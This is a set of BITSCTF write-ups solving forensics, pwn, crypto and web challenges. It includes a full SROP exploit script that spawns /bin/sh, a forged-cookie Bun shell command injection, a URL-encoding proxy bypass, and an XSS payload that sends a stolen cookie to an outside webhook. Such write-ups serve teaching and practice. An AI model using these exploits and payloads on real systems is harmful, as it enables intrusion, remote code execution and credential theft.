## 🔍 Forensics
### Jetpack Drift 
#### Challenge Description

> The download failed, but the investigation didn't. Before vanishing, a researcher captured the raw exchange between a broken server and a nosy client. Sift through the packets to recover what was lost.
#### Overview
The challenge provides a `chall.pcap` file containing HTTP traffic between a client (`curl/8.5.0` at `172.18.0.1`) and a server (`storagejetpack.in` at `172.18.0.10`). The goal is to recover an encrypted file transmitted in chunks over HTTP.
#### Step 1 — Pcap Analysis
Opening `chall.pcap` in Wireshark and following the HTTP streams reveals several interesting endpoints:

| Endpoint | Content |
|---|---|
| `/encryption.py` | Python script describing the encryption scheme |
| `/database.sql` | SQL dump with 250 users and passwords |
| `/send-chunks.php` | Encrypted file transmitted in HTTP chunked transfer encoding |
#### Step 2 — Understanding the Encryption Scheme (`encryption.py`)

The encryption uses **AES-CTR** mode with a key chain:  

- `initial_key = sha256(password)`
- `nonce = key[:16]`, counter initialized from nonce
- Each chunk is encrypted independently with its own key
- `next_key = sha256(plaintext_chunk)` — the key for chunk N+1 is derived from the plaintext of chunk N
- Chunk format: `NXTCHNKHASH:<sha256_hex_of_next_encrypted_chunk>DATA:<encrypted_data>`
- The last chunk has `NXTCHNKHASH:0000...0000`
- `CHUNK_SIZE = 12800` bytes
#### Step 3 — Finding the Password (`database.sql`)

The database contains a `passwdbase` table with 250 users. The username `tyler13bradley` with password `1VL7p6Rcli8mxgkh` stands out — it follows a realistic "name+number+name" pattern suggesting it belongs to the researcher who ran the encryption script.
#### Step 4 — Parsing the Encrypted Chunks

The `/send-chunks.php` response body uses HTTP chunked transfer encoding. Parsing the raw bytes reveals **10 encrypted chunks** (sizes: 7115 + 9×12881 bytes).
The chunks are transmitted **out of order**. To reconstruct the correct order, the hash chain embedded in each chunk's `NXTCHNKHASH` field is followed:
- Each chunk declares the SHA-256 hash of the *next* encrypted chunk
- Starting from the chunk whose hash matches `sha256(initial_key)` derived from the password, the chain is followed to determine the correct decryption order: `[5, 8, 2, 6, 4, 7, 3, 9, 1, 0]`
#### Step 5 — Decryption
With password `1VL7p6Rcli8mxgkh` and the correct chunk order:
1. Derive `initial_key = sha256(b'1VL7p6Rcli8mxgkh')`
2. For each chunk in order: decrypt with AES-CTR (`nonce = key[:16]`), then derive the next key as `sha256(plaintext)`
3. Concatenate all decrypted plaintext chunks
The result is **122234 bytes** identified as an **ICO file**.
#### Step 6 — Extracting the Flag Image

The ICO file contains an embedded **MP4 video** and a **PNG image**. The PNG (at ICO image offset 3801, size 17215 bytes, 900×732 pixels) contains the flag written as plain text:

**Flag: `BITSCTF{LF1_st4nds_4_1ost_fr0m_1ns1d3}`**

#### Summary
1. Analyzed pcap → found `/encryption.py`, `/database.sql`, `/send-chunks.php`
2. Identified AES-CTR key-chaining encryption with SHA-256 key derivation
3. Identified password `1VL7p6Rcli8mxgkh` (user `tyler13bradley`) from the database
4. Parsed HTTP chunked transfer encoding, reconstructed correct chunk order via hash chain
5. Decrypted all 10 chunks → 122234-byte ICO file
6. Extracted embedded PNG from ICO → flag visible as plain text

### Meow Transmission
#### Challenge Description
We are provided with three files:
- `chall.txt`: Gives a brief story about an intercepted image.
- `transmission.png`: The intercepted image, which appears to be noise.
- `comment.txt`: A text file containing hints about the transformation process used to scramble the image.  
  
The hints in `comment.txt` are as follows:
> Meow! I'm a cat who loves to transform..My journey involves 3 leaps through chaos..At each leap, I choose my style: [1, 2, 1].I spin [47, 37, 29] times at each stop..Each dance has its own rhythm: [96, 64, 96] spins to complete..The sequence of my adventure: [1, 2, 3].My world is 128x128 pixels wide...Perhaps a certain Russian mathematician knows my secret?
#### Analysis
The term "cat who loves to transform" combined with "Russian mathematician" immediately points to **Arnold's Cat Map**, a chaotic mathematical mapping named after Vladimir Arnold.
The mapping has the form:
$$ \begin{bmatrix} x_{n+1} \\ y_{n+1} \end{bmatrix} = \begin{bmatrix} 1 & p \\ q & pq+1 \end{bmatrix} \begin{bmatrix} x_n \\ y_n \end{bmatrix} \pmod N $$

Arnold's Cat Map has a notable property: it is **periodic**. Upon applying the map a certain number of times to an $N \times N$ image, the original image will reappear. The hints give us everything we need:
- The image dimensions ($N$): $128 \times 128$
- The order of "leaps" (number of transformations): 3 leaps.
- The "style" corresponds to parameters $p, q$. Style 1, 2, and 1 were used.
- The "spins" correspond to the number of iterations applied at each leap: 47, 37, and 29.
- The "rhythms" tell us the **periods** of the styles for an N=128 image: 96, 64, and 96. 

Based on the periods (96 and 64) for $N=128$, we can determine the $(p, q)$ parameters for the two styles:
- **Style 1 (Period 96):** Using $p=1, q=1$.
- **Style 2 (Period 64):** Using $p=2, q=1$.

Because the map is periodic, moving "backwards" by $S$ steps is equivalent to moving "forwards" by $Period - S$ steps.
To reverse the transformations, we must apply them in the exact opposite order (Leap 3 $\rightarrow$ Leap 2 $\rightarrow$ Leap 1).
1. Reverse Leap 3: apply Style 1 forwards by $96 - 29 = 67$ times.
2. Reverse Leap 2: apply Style 2 forwards by $64 - 37 = 27$ times.
3. Reverse Leap 1: apply Style 1 forwards by $96 - 47 = 49$ times.

#### Solution Steps

If we attempt to unscramble `transmission.png` directly, we find nothing but more noise. This tells us the data is hidden inside the image, potentially mapped in the LSB. Because the image shape is 128x128, it has just one channel (Grayscale). 

First, let's extract the Least Significant Bit (LSB) plane of the image.

```python
from PIL import Image
import numpy as np

img = Image.open('transmission.png')
arr = np.array(img)

# Extract LSB
lsb = (arr & 1) * 255
Image.fromarray(lsb.astype(np.uint8)).save('lsb.png')
```

Next, we write a script to simulate Arnold's Cat Map forwards by the required periods in reverse order to undo the scrambling:

```python
import numpy as np
from PIL import Image

def transform(img_array, p, q, spins):
    N = img_array.shape[0]
    res = img_array.copy()
    for _ in range(spins):
        new_res = np.zeros_like(res)
        for x in range(N):
            for y in range(N):
                # The inverse mapping strategy: taking pixels back into their right place
                nx = (x + p * y) % N
                ny = (q * x + (p * q + 1) * y) % N
                new_res[x, y] = res[nx, ny]
        res = new_res
    return res

img = Image.open('lsb.png').convert('L')
img_array = np.array(img)

# Reverse Leap 3
temp = transform(img_array, p=1, q=1, spins=96 - 29) # Style 1
# Reverse Leap 2
temp = transform(temp, p=2, q=1, spins=64 - 37)      # Style 2
# Reverse Leap 1
temp = transform(temp, p=1, q=1, spins=96 - 47)      # Style 1

Image.fromarray(temp).save('flag.png')
```

Opening `flag.png` reveals the flag written in plain text across the pixel map!
#### Flag
`BITSCTF{4rn0ld5_c4t_m4ps_4r3_p3r10d1c}`

## 🐚 PWN
### Mind the Gap

#### Initial Analysis
The given challenge is a 64-bit ELF executable named `mind_the_gap` without PIE, but with NX enabled. It dynamically links to libc. Loading it reveals a tiny `main` function (decompiled conceptually):
```c
int main() {
    char buf[0x100];
    return read(0, buf, 0x200);
}
```
This straightforwardly presents a classic Buffer Overflow vulnerability where we can read `0x200` bytes into a `0x100` byte buffer, overflowing onto the saved RBP and returning pointer (RIP) to achieve code execution.

However, the binary has very few gadgets available structure-wise:
- There is no `pop rdi; ret` or `pop rsi; ret` that would let us directly invoke `/bin/sh` or dump `read@got.plt`.
- It's not a static binary (`libc` is provided), so a standard `ret2syscall` requires an overarching construct like Sigreturn-Oriented Programming (SROP).
##### The Trampoline Gagdet
In `main`, prior to `read`, we have the following block of assembly used to initialize parameters:
```assembly
0x600145: lea    rax, [rbp-0x100]
0x60014c: mov    edx, 0x200
0x600151: mov    rsi, rax
0x600154: mov    edi, 0x0
0x600159: call   read@plt
0x60015e: mov    eax, 0x0
0x600163: leave
0x600164: ret
```
We'll call this the **"Trampoline"**. Notice how it uses `rbp` dynamically to define where to read data into (`[rbp - 0x100]`).
If we return to `0x600145` (the Trampoline snippet) while controlling `rbp`, we can set up subsequent `read` calls iteratively anywhere in memory—specifically the `.bss` region—effectively pivoting the stack into `.bss`. 
This allows us to progressively spray `.bss` with further instructions or frames!

Furthermore, since `leave` equates to `mov rsp, rbp; pop rbp`, `rbp` ultimately influences both the *destination of the next read* and the *new base pointer*.

#### Exploitation Approach
Our goal is to pivot to SROP. For SROP (`sys_rt_sigreturn`), we need:
1. Ensure a way to invoke a `syscall` universally.
2. Control `$rax` precisely to `15` (`0xf`).
3. Have a structurally intact `SigreturnFrame` right where `$rsp` executes the syscall.
##### 1. Obtaining a `syscall`
Instead of finding a hidden gadget, we can perform a partial overwrite on the GOT entry for `read`. `read@plt` jumps to `read@got.plt` (`0xc00000`), which eventually resolves the instruction sequence inside the provided `libc.so.6`.
Inside `libc.so.6`, the top of `<read>` handles syscall invocation. By overwriting only the **least significant byte (LSB)** of `read@got.plt` with `\xc8`, we adjust the pointer to skip the prologue and resolve precisely onto a `syscall` instruction within the `read` implementation in libc! Now, whenever `read@plt` (`0x600040`) is hit, it will execute an arbitrary `syscall`.

##### 2. Setting `$rax` for Sigreturn
Notice `eax = 0` happens right after the `read@plt` call inside the Trampoline. However, `read` itself behaves by returning the *number of bytes read* uniformly into `rax`.
Thus, if we have a `read` that waits for input, and we send *exactly* `15` bytes, `rax` will become `15`. 
But there is an even cleaner route: When we pivot our `rbp` backwards, `lea rax, [rbp-0x100]` will implicitly place the address computed into `rax`. If we specifically align `rbp = 0x10f`, then `lea rax` sets exactly `rax = 0x10f - 0x100 = 0xf` (`15`). The `eax = 0` only happens if the Trampoline `read` concludes properly, but if our overwritten `syscall` hits, the context switch intercepts `$rax` safely. Thus, we control `rax=15` perfectly!

##### 3. Framing the SROP
The plan translates to chaining multiple inputs using stack pivots:
- **Payload 1**: Overflows the initial stack `buf` with padding, overwriting RBP to `0xc00200` (in `.bss`) and RIP to the Trampoline (`0x600145`). Since `0xc00200 - 0x100 = 0xc00100`, the next `read` expects inputs directed iteratively to `.bss` `0xc00100`.

- **Payload 2**: The process executes the first Trampoline and waits for 0x200 bytes at `0xc00100`. We supply:
  - At `0xc00100`: `rbp` placeholder for Payload 3 (`0x10f` - sets rax to 15).
  - At `0xc00108`: `rip` placeholder for Payload 3 (Trampoline).
  - At `0xc00110`...: Our `SigreturnFrame` (shifted to ignore the first 8 missing context bytes since we lack `pretcode`).
  - The SROP frame tells it to invoke `sys_execve` (`rax = 59`), pointing `rdi` towards `/bin/sh\x00`, clearing `rsi` and `rdx`, and jumping to `read@plt` which is now a `syscall`. `csgsfs` is correctly set as `(0x2b << 48) | 0x33`.
  - At `0xc00200`: `rbp` placeholder for Payload 2 completion (`0xc00100` again!).
  - At `0xc00208`: `rip` placeholder for Payload 2 completion (Trampoline).
  - At `0xc00210`: the `/bin/sh\x00` string for `rdi`.

- **Payload 3**: The program asks for input to `0xc00000`. Overwrite `read@got.plt`! We send `\xc8` (1 byte).
With the LSB poisoned remotely, the binary hits our `0x10f` pivot. It calculates `rax = 15`, jumps to `read@plt` (now `syscall`), triggering `rt_sigreturn`. This evaluates our custom frame directly from `.bss`, ultimately issuing `execve(/bin/sh)`!

#### Exploit Script
```python
from pwn import *
import time
context.arch = 'amd64'

# p = process('./mind_the_gap')
p = remote('chals.bitskrieg.in', 30807)

trampoline = 0x600145
read_plt = 0x600040

# Payload 1: Overflow the initial buffer to pivot stack
payload1 = b'A' * 0x100
payload1 += p64(0xc00200) # next rbp -> read to 0xc00100
payload1 += p64(trampoline) # next rip
p.send(payload1)
time.sleep(0.5)

# Payload 2: Setup sigframe and next pivot
# Written to 0xc00100
frame = SigreturnFrame()
frame.rax = 59 # sys_execve
frame.rdi = 0xc00210 # "/bin/sh\x00" location
frame.rsi = 0
frame.rdx = 0
frame.rip = read_plt # read@plt (now syscall)
frame.rsp = 0xc00500 # Valid stack
frame.csgsfs = (0x2b << 48) | 0x33

payload2 = bytearray(0x200)
# Frame is shifted 8 bytes explicitly to map to ucontext behavior under kernel signal
payload2[0x00:0x08] = p64(0x10f) # future rbp for Trampoline 3
payload2[0x08:0x10] = p64(trampoline) # future rip for Trampoline 3
payload2[0x10:0x10+0xf0] = bytes(frame)[8:] 

# Overwrite offsets 0x100 and 0x108 for Trampoline 2
payload2[0x100:0x108] = p64(0xc00100) # future rbp for Trampoline 2
payload2[0x108:0x110] = p64(trampoline) # future rip for Trampoline 2
payload2[0x110:0x118] = b'/bin/sh\x00'

p.send(bytes(payload2))
time.sleep(0.5)

# Payload 3: Trigger 1 byte overwrite of read@got to make it syscall
p.send(b'\xc8')

time.sleep(0.5)
p.sendline(b'cat flag.txt')
print(p.recvall(timeout=2).decode())
```

#### Result
`BITSCTF{58b1a37a014783be5ba183298073d20f}`
## 🔐 Crypto
### Aliens Eat Snacks 

#### Initial Analysis
The challenge provides us with two files:
- `aes.py`: A custom AES implementation.
- `output.txt`: An output file containing a `key_hint`, the `encrypted_flag`, and 1000 pairs of plaintext-ciphertext samples.

On inspecting `aes.py`, we observe the following:
1. **Reduced Rounds**: The custom AES implementation uses only $4$ rounds instead of the standard $10$ for a $128$-bit key.
2. **Custom S-Box**: The S-Box is generated using $gf\_pow(x, 23)$ instead of the standard $x^{-1}$, and XORs it with $0x63$.
3. **Rest of the implementation**: The rest looks fairly standard, including `MixColumns`, `ShiftRows`, `AddRoundKey`, and `SubBytes`. Although it operates on $4$ rounds, the key schedule functions and operations are largely based on the AES specification.

In `output.txt`, we are given a `key_hint`:
`key_hint: 26ab77cadcca0ed41b03c8f2e5`

This hint is a $26$-character hex string, representing $13$ bytes. Since an AES-128 key requires $16$ bytes, we are missing precisely $3$ bytes of the key.

#### Finding the Key
A missing key space of $3$ bytes means there are $256^3 \approx 16.7$ million possible keys. This is extremely small and well within the bounds of a brute-force attack in C/C++. 

We can use the first plaintext/ciphertext pair from `output.txt`:
- PT: `376f73334dc9db2a4d20734c0783ac69`
- CT: `9070f81f4de789663820e8924924732b`

We can rewrite the Python encryption algorithm into C to achieve native execution speeds. The C code will:
1. Initialize the custom S-Box.
2. Initialize the known $13$ bytes of the key.
3. Iterate over the remaining $3$ bytes (`i, j, k` from `0` to `255`).
4. Perform key expansion for that key.
5. Encrypt the plaintext.
6. Compare with the known ciphertext.

##### C Brute-force Script (`brute.c`)
```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define IRREDUCIBLE_POLY 0x11B

uint8_t gf_mult(uint8_t a, uint8_t b) {
    uint8_t result = 0;
    for (int i = 0; i < 8; i++) {
        if (b & 1) result ^= a;
        uint8_t hi_bit = a & 0x80;
        a = (a << 1);
        if (hi_bit) a ^= (IRREDUCIBLE_POLY & 0xFF);
        b >>= 1;
    }
    return result;
}

uint8_t gf_pow(uint8_t base, uint8_t exp) {
    if (exp == 0) return 1;
    uint8_t result = 1;
    while (exp > 0) {
        if (exp & 1) result = gf_mult(result, base);
        base = gf_mult(base, base);
        exp >>= 1;
    }
    return result;
}

uint8_t SBOX[256];
uint8_t RCON[10] = {0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36};

void init_sbox() {
    for (int i = 0; i < 256; i++) {
        SBOX[i] = gf_pow(i, 23) ^ 0x63;
    }
}

// ... helper functions for KeyExpansion and EncryptBlock ...
// (Refer to brute.c in the challenge folder for the full AES functions)

int main() {
    init_sbox();
    
    uint8_t target_pt[16] = {0x37, 0x6f, 0x73, 0x33, 0x4d, 0xc9, 0xdb, 0x2a, 0x4d, 0x20, 0x73, 0x4c, 0x07, 0x83, 0xac, 0x69};
    uint8_t target_ct[16] = {0x90, 0x70, 0xf8, 0x1f, 0x4d, 0xe7, 0x89, 0x66, 0x38, 0x20, 0xe8, 0x92, 0x49, 0x24, 0x73, 0x2b};
    
    uint8_t key[16];
    uint8_t key_hint[13] = {0x26, 0xab, 0x77, 0xca, 0xdc, 0xca, 0x0e, 0xd4, 0x1b, 0x03, 0xc8, 0xf2, 0xe5};
    for (int i = 0; i < 13; i++) key[i] = key_hint[i];
    
    uint8_t round_keys[5 * 16];
    uint8_t ct[16];
    
    for (int i = 0; i < 256; i++) {
        key[13] = i;
        for (int j = 0; j < 256; j++) {
            key[14] = j;
            for (int k = 0; k < 256; k++) {
                key[15] = k;
                
                key_expansion(key, round_keys);
                encrypt_block(target_pt, round_keys, ct);
                
                int match = 1;
                for (int x = 0; x < 16; x++) {
                    if (ct[x] != target_ct[x]) {
                        match = 0;
                        break;
                    }
                }
                
                if (match) {
                    printf("Found key: ");
                    for (int x = 0; x < 16; x++) printf("%02x", key[x]);
                    printf("\n");
                    return 0;
                }
            }
        }
    }
    
    return 0;
}
```

Compiling with `-Ofast` allows it to finish the brute force very quickly. Note that we actually didn't need to read the 1000 samples, testing against just one PT-CT block correctly identified the full key:
`26ab77cadcca0ed41b03c8f2e5cdec0c`

#### Decrypting the Flag
With the key fully recovered, we can decrypt the provided `encrypted_flag` by writing a small Python wrapper over their `aes.py` class:

```python
import binascii
from aes import AES

# Key recovered from C brute forcer
key = binascii.unhexlify("26ab77cadcca0ed41b03c8f2e5cdec0c")
cipher = AES(key)

encrypted_flag = binascii.unhexlify("8e70387dc377a09cbc721debe27c468157b027e3e63fe02560506f70b3c72ca19130ae59c6eef47b734bb0147424ec936fc91dc658d15dee0b69a2dc24a78c44")

# Decrypt block by block (ECB style)
out = b""
for i in range(0, len(encrypted_flag), 16):
    out += cipher.decrypt(encrypted_flag[i:i+16])

print(out)
```

Running this reveals the flag:
`BITSCTF{7h3_qu1ck_br0wn_f0x_jump5_0v3r_7h3_l4zy_d0g}`

## 🕸️ Web

### Elysia's Bakery

#### Challenge Analysis

We are given a basic notepad application built with [ElysiaJS](https://elysiajs.com/) and [Bun](https://bun.sh/). The application allows users to register, login, save notes, and and access a restricted `/admin/list` endpoint. The goal is to read the `/flag.txt` on the server and get the flag `BITSCTF{...}`.

The backend exposes the following features:
- Authentication via username and password.
- Creation and deletion of notes.
- An `/admin/list` endpoint which simply uses Bun's shell feature (`$`) to list folder contents.

#### Vulnerabilities

The challenge consists of two distinct vulnerabilities:
1. Session Cookie Signature Bypass
2. Command Injection via Bun Shell's `raw` Object

##### 1. Session Cookie / Authentication Bypass

The authentication system uses Elysia's cookies to store the username of the logged-in user. The app initializes cookie signing globally:

```typescript
const app = new Elysia({
  cookie: {
    secrets: [Bun.env.SECRET_KEY || "super_secret_key"],
    sign: ["session"],
  },
})
```

While this configures a secret, ElysiaJS expects you to enforce signature validation via a route schema using `t.Cookie`. If you do not explicitly enforce the cookie schema on the route, Elysia parses incoming cookies but **does not reject unsigned cookies or invalid signatures**. Instead, it passes the raw cookie string value through when accessing `session.value`.

When the admin backend validates standard users:
```typescript
function getSessionUser(session: any): string | null {
  if (!session.value) return null;
  return typeof session.value === "string" ? session.value : null;
}
```

By simply intercepting our request and altering our cookie header to `Cookie: session=admin`, `session.value` correctly resolves to `"admin"`. Since the code blindly trusts `session.value`, this instantly acts as an authentication bypass, granting us admin privileges without requiring a valid password or signature.

##### 2. Command Injection via Bun Shell

Once we have admin access, we can communicate with the `/admin/list` endpoint. Looking at the code:

```typescript
  .post("/admin/list", async ({ cookie: { session }, body }) => {
    // ... authentication checks ...
    const folder = (body as any).folder;

    if (typeof folder === "string" && folder.includes("..")) {
      return status(400, "Invalid folder path");
    }
    try {
      const result = $`ls ${folder}`.quiet();
      // ... return result
```

This endpoint passes our JSON `folder` input into Bun's `$` template literal shell execution. Bun's shell execution engine is typically secure against command injection because it automatically escapes strings injected.

However, the developer made two mistakes here:
1. They checked `typeof folder === "string"` to prevent path traversal (`..`), but they **didn't reject other types**, such as an object.
2. In the Bun shell API, injecting an object shaped like `{ raw: "..." }` instructs Bun to skip escaping and treat the value as a literal raw string in the command.

To exploit this, we simply submit an array/object structure using `{ "raw": "... injected commands ..." }` to bypass the sanitization checks and gain arbitrary command execution.

#### Exploit Execution

Using `curl`, we can chain these two vulnerabilities:

```bash
curl -s -X POST http://chals.bitskrieg.in:23405/admin/list \
  -H "Cookie: session=admin" \
  -H "Content-Type: application/json" \
  -d '{"folder": {"raw": "; cat /flag.txt"}}'
```

- `-H "Cookie: session=admin"` bypasses validation.
- `-d '{"folder": {"raw": "; cat /flag.txt"}}'` breaks out of the `ls` string and executes `cat /flag.txt` without getting escaped.

##### Response

The result contains the standard `ls` output followed by our flag readout:

```json
{"files":["notes","public","src","node_modules","bun.lock","package.json","BITSCTF{33c2246b39b929f1f6866e8e5dcc9117}"]}
```

**Flag:** `BITSCTF{33c2246b39b929f1f6866e8e5dcc9117}`

### Rusty Proxy

#### Challenge Description
We are given the source code for a custom HTTP reverse proxy written in Rust (`proxy/src/main.rs`) and a backend application written in Python (`backend/server.py`) using Flask and Cheroot WSGI server. 
Our goal is to access the flag endpoint at `/admin/flag`.

#### Analysis

##### The Protection
The custom reverse proxy has a naive check to restrict access to paths starting with `/admin`:

```rust
fn is_path_allowed(path: &str) -> bool {
    let normalized = path.to_lowercase();
    if normalized.starts_with("/admin") {
        return false;
    }
    true
}
```

The parsed `path` string from the HTTP request line is passed directly to this function inside `handle_client`:
```rust
if !is_path_allowed(&meta.path) {
    let _ = send_error(&mut write_half, "403 Forbidden", "Access denied.\n").await;
    // ...
}
```

#### The Vulnerability (Unintended Bypass)
Because the rust proxy reads the raw path from the HTTP request line and compares it *without URL decoding*, but the backend Flask (Werkzeug) server *automatically URL decodes* the request path, a semantic discrepancy (parser differential) exists. 

We can bypass the `starts_with("/admin")` check by simply URL-encoding the first character of `/admin`. 

For example, `a` becomes `%61`. The proxy sees `/%61dmin/flag`, checks if it starts with `/admin` (it doesn't), and happily forwards it. The backend decodes `%61dmin` back to `admin`, matches the `/admin/flag` route, and serves the flag.

#### Exploit

Simply run a curl request URL-encoding any character in 'admin':

```bash
curl -s "http://rusty-proxy.chals.bitskrieg.in:25001/%61dmin/flag"
```

**Response:**
```json
{"flag":"BITSCTF{tr4il3r_p4r51n6_15_p41n_1n_7h3_4hh}"}
```

##### Intended Solution (Hinted by Flag)
The flag `BITSCTF{tr4il3r_p4r51n6_15_p41n_1n_7h3_4hh}` implies that the author's intended solution involved HTTP Request Smuggling via chunked transfer encoding and HTTP trailers. 

Looking at `forward_body` in `proxy/src/main.rs`, the proxy handles chunked requests and specifically processes trailers:
```rust
if chunk_size == 0 {
    loop {
        let mut trailer = String::new();
        // ...
        if trailer.trim_end().is_empty() {
            backend.write_all(b"\r\n").await?;
            break;
        }
        // ... check trailer field-name
        backend.write_all(trailer.as_bytes()).await?;
    }
}
```

By providing a malformed trailer or exploiting how Cheroot parses trailers versus how the custom Rust proxy forwards them, an attacker could likely smuggle a hidden second HTTP request inside the body, completely circumventing the URL path checking. However, the lack of URL decoding in the Rust proxy's authorization logic provided a much simpler bypass!

### SafePaste

#### Overview
SafePaste is a pastebin-like web application written in Node.js/Express. Users can create HTML-formatted pastes that are sanitized using the venerable `isomorphic-dompurify` library and then view them at a unique UUID endport (`/paste/<id>`). The challenge also features an admin bot that can be triggered to visit any paste linked from the `/report` endpoint.

The goal is to steal the admin bot's `FLAG` cookie.

#### Analysis & Vulnerabilities

##### 1. Template Rendering (XSS)
The core rendering logic in `server.ts` combines static template files and the generated paste content:
```typescript
const clean = DOMPurify.sanitize(content);
pastes.set(id, clean);

app.get("/paste/:id", (req, res) => {
  const content = pastes.get(req.params.id);
  // ... check if exists ...
  const html = pasteTemplate.replace("{paste}", content);
  res.type("html").send(html);
});
```

At first glance, `DOMPurify` provides robust defenses against XSS. However, the flaw is in the `.replace("{paste}", content)` method. In JavaScript, `String.prototype.replace()` interprets special character sequences in the replacement string.

Specifically, the `$`` (dollar sign followed by backtick) pattern is replaced by **the portion of the string that precedes the matched substring**.

Consider the template prefix string:
```html
<!doctype html>
<html lang="en">
  <head>...
  </head>
  <body>
    ...
      <img src="/logo.png" alt="SafePaste" />
      <div class="content">
```

If we input `<a title="$`<script>[XSS]</script>">x</a>`:
1. `DOMPurify` views the `<script>` tag as innocent text inside an HTML attribute value (`title`), so it doesn't strip it.
2. During the `replace()` call, `$`` expands to the entire HTTP prefix string shown above.
3. The prefix contains unescaped double-quote `"` characters (e.g., in `alt="SafePaste"`). When expanded inside our `title="..."` attribute, the first injected quote forcibly *closes* the attribute context early.
4. The injected HTML becomes tangled, pushing the `<script>` tag out of the attribute and into the raw document context where the browser executes it!

##### 2. Bypassing the Path-restricted Cookie
The admin bot sets its cookie with a specific path restriction:
```typescript
await page.setCookie({
  name: "FLAG",
  value: FLAG,
  domain: APP_HOST,
  path: "/hidden",
});
```
Because the cookie paths do not match, JavaScript executing on `/paste/<id>` will evaluate `document.cookie` as empty. Furthermore, standard navigation to `/hidden` executes `res.socket?.destroy();` terminating the connection instantly, breaking typical loading approaches.

**Bypass**:
We can load a non-existent path dynamically under the `/hidden` directory, such as `/hidden/foo`. The application's catch-all error handler handles this request, returning a default 404 HTML page instead of destroying the TCP socket! 

Because the `/hidden/foo` iframe successfully loads under the same origin and matches the cookie's path scope, we can simply read the child iframe's document cookie from the parent XSS context:
```javascript
let i = document.createElement('iframe');
i.src = '/hidden/foo';
i.onload = () => {
    let flag = i.contentDocument.cookie;
    // Exfiltrate flag...
};
document.body.appendChild(i);
```

##### 3. Evading CSP for Exfiltration
The challenge enforces a Content Security Policy (CSP):
`Content-Security-Policy: script-src 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; default-src 'self'`

The `default-src 'self'` directive blocks `fetch()`, `XMLHttpRequest`, and `<img>` requests from communicating with external servers. However, it does **not** restrict top-level navigation. To exfiltrate the flag, we simply modify `window.location` to send the bot to a public webhook with the data embedded in the URL.

#### The Exploit

Tying the elements together, the final payload string looks like this:
```html
<a title="$`<script>let i=document.createElement('iframe');i.src='/hidden/foo';i.onload=()=>{window.location='https://webhook.site/YOUR_WEBHOOK?f='+encodeURIComponent(i.contentDocument.cookie)};document.body.appendChild(i);</script>">x</a>
```

##### Exploit Steps
1. URL encode the payload and `POST` it to the `/create` endpoint.
2. Extract the newly generated `/paste/<UUID>`.
3. Submit a `POST` request to `/report`, passing the fully qualified URL (identifying the correct application IP) to the admin bot.
4. Wait for the bot to visit the page, trigger the XSS payload, load the local iframe to leak the cookie path, and redirect to the webhook.

#### Flag
`BITSCTF{n07_r34lly_4_d0mpur1fy_byp455?_w3b_6uy_51nc3r3ly_4p0l061535_f0r_7h3_pr3v10u5_ch4ll3n635🍠}`
